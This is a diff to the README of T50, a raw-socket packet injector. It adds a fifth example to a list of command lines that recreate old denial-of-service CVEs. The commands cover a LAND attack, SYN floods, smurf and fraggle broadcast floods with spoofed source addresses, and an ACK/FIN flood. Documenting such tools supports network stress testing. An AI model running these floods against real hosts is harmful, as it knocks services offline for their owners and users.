@@ -109,15 +109,17 @@ This new version ([5.3](https://github.com/nbrito/source/tree/master/c/t50/5.3) 
 
 The main differentiator of the **T50** is that it is able to send all protocols, sequentially, using one single [RAW(7) SOCKET](https://en.wikipedia.org/wiki/Raw_socket), besides it can be capable to modify network routes.
 
-### Examples
+## Examples
 1.  [CVE-1999-0016](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0016):
 * ```$ sudo ./t50 [target-address]  --dport [target-port] --saddr [target-address] --sport [target-port] --protocol TCP --syn --sequence 3868 --window 2048 --threshold 1```
-2. [CVE-1999-0116](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0116)
+2. [CVE-1999-0116](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0116):
 * ```$ sudo ./t50 [target-address] --dport [target-port] --protocol TCP -S --flood```
-3. [CVE-1999-0513](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0513)
+3. [CVE-1999-0513](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0513):
 * ```$ sudo ./t50 [broadcast-address] --saddr [target-address] --protocol ICMP --icmp-type 8 --icmp-code 0 --flood```
-4. [CVE-1999-0514](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0514)
+4. [CVE-1999-0514](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0514):
 * ```$ sudo ./t50 [broadcast-address] --saddr [target-address] --protocol UDP --icmp-type 8 --icmp-code 0 --flood```
+5. [CVE-2002-1712](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1712):
+* ```$ sudo ./t50 [target-address]  --dport [target-port] --protocol TCP --ack --fin --window 16384 --flood```
 
 For current release of **T50**, please, refer to this [link](https://github.com/fredericopissarra/t50).
 
